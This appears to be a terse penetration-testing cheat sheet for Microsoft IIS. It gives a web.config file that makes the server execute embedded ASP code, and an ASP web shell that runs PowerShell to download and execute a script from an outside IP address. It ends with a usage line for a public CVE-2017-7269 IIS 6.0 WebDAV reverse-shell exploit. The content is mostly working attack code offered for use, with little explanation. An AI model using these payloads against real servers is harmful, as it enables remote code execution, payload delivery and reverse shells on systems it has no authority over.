:____

Internet Information Services, also known as IIS, is **a Microsoft web server that runs on Windows operating system and is used to exchange static and dynamic web content with internet users**. I

> aspx


# Include asp in web.config

https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/

```html
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html

```
<%
Set co =  CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/PS.ps1')")
output = cte.StdOut.Readall()
Response.write(output)
%>
```


# IIS 6.0

WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow

https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269

Usage:

```bash
python2 iis6\ reverse\ shell 10.10.10.14 80 10.10.14.11 443
```
